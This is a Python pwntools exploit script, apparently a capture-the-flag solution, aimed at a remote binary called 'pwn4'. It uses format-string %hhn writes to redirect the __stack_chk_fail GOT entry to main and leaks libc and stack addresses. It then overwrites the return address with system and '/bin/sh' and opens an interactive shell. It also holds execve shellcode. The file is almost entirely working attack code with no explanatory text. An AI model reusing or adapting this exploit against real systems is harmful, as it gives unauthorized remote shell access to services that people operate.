from pwn import *
context.log_level = 'DEBUG'

TARGET = './pwn4'
HOST = '104.154.106.182'
PORT = 5678

SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
watch *0x8049904
b*0x80485b0
c
''')
elf = ELF(TARGET)

r.recvuntil('new?')

payload = ''
for i in range(4):
	payload += p32(elf.got['__stack_chk_fail'] + i)

offset = 4 * 4
value = elf.sym['main']
dbg("value")

for i in range(4):
	payload += '%'
	c = (((value >> (i*8)) - offset) % 256)
	payload += str(c)
	payload += 'c%'
	payload += str(7+i)
	payload += '$hhn'
	offset += c
payload += 'a' * 80
r.sendline(payload)

print "-----------------------" 
r.recvuntil('new?')

payload = ''
payload += '%87$x, %42$x, '
payload += 'a' * 120
r.sendline(payload)

print "-----------------------"
leak = r.recvuntil('new?')

# ret addr offest: -152
libc_leak = int(leak.split('\n')[2].split(', ')[0], 16)
ret_addr = int(leak.split('\n')[2].split(', ')[1], 16) + 4

# base = libc_leak - 0x18637# 0x19af3 # compe
# system = base + 0x3ada0# 0x40310 # compe
# binsh = base + 0x15ba0b# 0x122a3c # compe
base = libc_leak - 0x19af3 # compe
system = base + 0x40310 # compe
binsh = base + 0x162d4c # compe
dbg("base")
dbg("ret_addr")

payload = ''
for i in range(4):
	payload += p32(ret_addr + i)

for i in range(4):
	payload += p32(ret_addr + 8 + i)

offset = 4 * 8
value = (binsh << 32) | system
dbg("value")

for i in range(8):
	payload += '%'
	c = (((value >> (i*8)) - offset) % 256)
	payload += str(c)
	payload += 'c%'
	payload += str(7+i)
	payload += '$hhn'
	offset += c
# payload += 'a' * 1000
r.sendline(payload)
r.interactive()
r.close()
